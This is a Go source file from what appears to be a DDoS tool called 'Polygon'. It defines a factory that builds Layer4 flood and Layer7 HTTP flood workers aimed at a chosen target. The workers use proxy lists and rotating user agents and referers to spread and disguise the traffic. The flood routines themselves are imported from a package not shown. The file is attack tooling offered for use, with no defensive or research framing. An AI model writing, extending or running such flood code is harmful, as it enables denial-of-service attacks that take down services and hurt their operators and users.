package core

import (
	"context"
	"net"

	"Polygon/attack"
	"Polygon/proxy"
	"Polygon/tools"
)

// AttackFactory creates WorkerFuncs for Layer4 and Layer7 attacks.
// Factory Pattern: callers describe WHAT they want; the factory knows HOW to build it.
type AttackFactory struct {
	localIP net.IP
}

// NewAttackFactory resolves the local outbound IP once and returns a factory.
func NewAttackFactory() *AttackFactory {
	ipStr, _ := tools.LocalIP()
	return &AttackFactory{localIP: net.ParseIP(ipStr)}
}

// Layer4Worker returns a WorkerFunc that runs a single Layer4 flood goroutine.
func (f *AttackFactory) Layer4Worker(
	target string, port uint16, method string,
	refs []string, proxies []proxy.Proxy, protocolID int,
) WorkerFunc {
	return func(ctx context.Context) {
		l4 := &attack.Layer4{
			Target:     target,
			Port:       port,
			Method:     method,
			Refs:       refs,
			Proxies:    proxies,
			ProtocolID: protocolID,
			LocalIP:    f.localIP,
		}
		l4.Run(ctx)
	}
}

// Layer7Worker returns a WorkerFunc that runs a single Layer7 HTTP flood goroutine.
func (f *AttackFactory) Layer7Worker(
	targetURL, host, method string,
	rpc int,
	userAgents, referers []string,
	proxies []proxy.Proxy,
	threadID int,
) WorkerFunc {
	return func(ctx context.Context) {
		flood := &attack.HTTPFlood{
			TargetURL:  targetURL,
			Host:       host,
			Method:     method,
			RPC:        rpc,
			UserAgents: userAgents,
			Referers:   referers,
			Proxies:    proxies,
			ThreadID:   threadID,
		}
		flood.Run(ctx)
	}
}
